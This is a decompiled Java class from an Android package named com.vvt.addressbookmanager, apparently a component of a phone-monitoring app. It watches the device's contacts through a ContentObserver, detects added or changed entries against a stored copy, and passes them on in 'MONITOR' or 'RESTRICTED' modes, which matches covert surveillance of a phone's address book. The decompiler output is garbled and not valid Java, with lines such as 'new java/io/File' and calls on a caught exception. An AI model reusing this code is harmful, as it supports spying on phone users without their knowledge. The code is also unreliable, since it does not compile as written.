package com.vvt.addressbookmanager.b.b;

import android.content.ContentResolver;
import android.content.Context;
import android.database.ContentObserver;
import android.net.Uri;
import com.vvt.base.FxAddressbookMode;
import com.vvt.events.FxAddressBookEvent;
import com.vvt.io.p;
import java.io.File;
import java.io.IOException;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.List;
import java.util.Timer;

public class d
  extends ContentObserver
  implements com.vvt.addressbookmanager.b.b
{
  private static final boolean a = com.vvt.addressbookmanager.d.a;
  private static final boolean b = com.vvt.addressbookmanager.d.e;
  private com.vvt.addressbookmanager.b.c c;
  private FxAddressbookMode d;
  private Timer e;
  private Context f;
  private boolean g;
  private com.vvt.addressbookmanager.e h;
  private String i;
  
  public d()
  {
    super(null);
    FxAddressbookMode localFxAddressbookMode = FxAddressbookMode.OFF;
    this.d = localFxAddressbookMode;
    this.e = null;
    this.g = false;
  }
  
  private void a(List paramList)
  {
    boolean bool1 = a;
    boolean bool2;
    String str;
    if ((!bool1) || (paramList != null))
    {
      int j = paramList.size();
      if (j > 0) {}
    }
    else
    {
      bool2 = b;
      if (bool2) {}
      str = this.i;
      b.b(str);
    }
    for (;;)
    {
      return;
      bool2 = a;
      if (bool2) {}
      str = this.i;
      b.a(paramList, str);
      bool2 = a;
      if (!bool2) {}
    }
  }
  
  private void a(boolean paramBoolean)
  {
    boolean bool1 = a;
    if (bool1) {}
    File localFile = new java/io/File;
    String str = f();
    localFile.<init>(str);
    if (paramBoolean)
    {
      boolean bool2 = localFile.exists();
      if (!bool2) {}
    }
    for (;;)
    {
      return;
      try
      {
        localFile.createNewFile();
      }
      catch (IOException localIOException)
      {
        bool1 = b;
      }
      if (bool1)
      {
        continue;
        localIOException.delete();
      }
    }
  }
  
  private void d()
  {
    boolean bool = a;
    if (bool) {}
    ArrayList localArrayList = c.a(this.f, false);
    int j = localArrayList.size();
    if (j > 0) {
      a(localArrayList);
    }
    bool = a;
    if (bool) {}
  }
  
  private boolean e()
  {
    File localFile = new java/io/File;
    String str = f();
    localFile.<init>(str);
    boolean bool1 = localFile.exists();
    boolean bool2 = a;
    if (bool2) {}
    return bool1;
  }
  
  private String f()
  {
    String str = p.a(this.i, "addressbook");
    File localFile = new java/io/File;
    localFile.<init>(str);
    boolean bool = localFile.exists();
    if (!bool) {
      localFile.mkdirs();
    }
    return p.a(str, "coutdown");
  }
  
  private void g()
  {
    ArrayList localArrayList1;
    Object localObject4;
    ArrayList localArrayList2;
    try
    {
      boolean bool1 = a;
      if (bool1) {}
      Object localObject1 = this.f;
      localArrayList1 = null;
      localArrayList1 = c.a((Context)localObject1, false);
      bool1 = a;
      if (bool1) {}
      localObject1 = this.i;
      localObject4 = b.a((String)localObject1);
      bool1 = a;
      if (bool1) {}
      localArrayList2 = new java/util/ArrayList;
      localArrayList2.<init>();
      Iterator localIterator = localArrayList1.iterator();
      for (;;)
      {
        bool1 = localIterator.hasNext();
        if (!bool1) {
          break;
        }
        localObject1 = localIterator.next();
        localObject1 = (FxAddressBookEvent)localObject1;
        boolean bool3 = ((List)localObject4).contains(localObject1);
        if (!bool3)
        {
          bool3 = a;
          if (bool3) {}
          localArrayList2.add(localObject1);
        }
      }
      j = localArrayList2.size();
    }
    finally {}
    int j;
    Object localObject3;
    if (j > 0)
    {
      a(localArrayList1);
      localObject3 = this.d;
      localObject4 = FxAddressbookMode.RESTRICTED;
      if (localObject3 == localObject4)
      {
        localObject3 = this.c;
        ((com.vvt.addressbookmanager.b.c)localObject3).a(localArrayList2);
        localObject3 = this.h;
        if (localObject3 != null)
        {
          localObject3 = this.h;
          ((com.vvt.addressbookmanager.e)localObject3).a();
        }
      }
    }
    for (;;)
    {
      boolean bool2 = a;
      if (bool2) {}
      return;
      localObject3 = this.d;
      localObject4 = FxAddressbookMode.MONITOR;
      if (localObject3 == localObject4)
      {
        localObject3 = this.c;
        ((com.vvt.addressbookmanager.b.c)localObject3).a(localArrayList1);
        continue;
        int k = localArrayList1.size();
        int m = ((List)localObject4).size();
        if (k < m)
        {
          localObject3 = this.d;
          localObject4 = FxAddressbookMode.MONITOR;
          if (localObject3 == localObject4)
          {
            localObject3 = this.c;
            ((com.vvt.addressbookmanager.b.c)localObject3).a(localArrayList1);
          }
        }
      }
    }
  }
  
  public void a()
  {
    boolean bool = a;
    if (bool) {}
    Object localObject1 = this.f;
    if (localObject1 == null)
    {
      bool = b;
      if (!bool) {}
    }
    for (;;)
    {
      return;
      bool = this.g;
      if (!bool)
      {
        localObject1 = this.f.getContentResolver();
        Object localObject2 = a.a;
        ((ContentResolver)localObject1).registerContentObserver((Uri)localObject2, false, this);
        localObject1 = new java/lang/Thread;
        localObject2 = new com/vvt/addressbookmanager/b/b/e;
        ((e)localObject2).<init>(this);
        String str = "AddressbookCMT";
        ((Thread)localObject1).<init>((Runnable)localObject2, str);
        ((Thread)localObject1).start();
        bool = true;
        this.g = bool;
      }
      bool = a;
      if (!bool) {}
    }
  }
  
  public void a(Context paramContext)
  {
    this.f = paramContext;
  }
  
  public void a(com.vvt.addressbookmanager.b.c paramc)
  {
    this.c = paramc;
  }
  
  public void a(com.vvt.addressbookmanager.e parame)
  {
    this.h = parame;
  }
  
  public void a(FxAddressbookMode paramFxAddressbookMode)
  {
    this.d = paramFxAddressbookMode;
  }
  
  public void a(String paramString)
  {
    this.i = paramString;
  }
  
  public void b()
  {
    boolean bool = a;
    if (bool) {}
    this.f.getContentResolver().unregisterContentObserver(this);
    bool = false;
    this.c = null;
    Object localObject = this.e;
    if (localObject != null)
    {
      localObject = this.e;
      ((Timer)localObject).cancel();
    }
    this.g = false;
    a(false);
    localObject = this.i;
    b.b((String)localObject);
    bool = a;
    if (bool) {}
  }
  
  public void onChange(boolean paramBoolean)
  {
    Timer localTimer = this.e;
    if (localTimer != null)
    {
      localTimer = this.e;
      localTimer.cancel();
      boolean bool = a;
      if (!bool) {}
    }
    a(true);
    localTimer = new java/util/Timer;
    localTimer.<init>();
    this.e = localTimer;
    localTimer = this.e;
    f localf = new com/vvt/addressbookmanager/b/b/f;
    localf.<init>(this);
    localTimer.scheduleAtFixedRate(localf, 0L, 1000L);
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/addressbookmanager/removeFromPath/removeFromPath/d.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */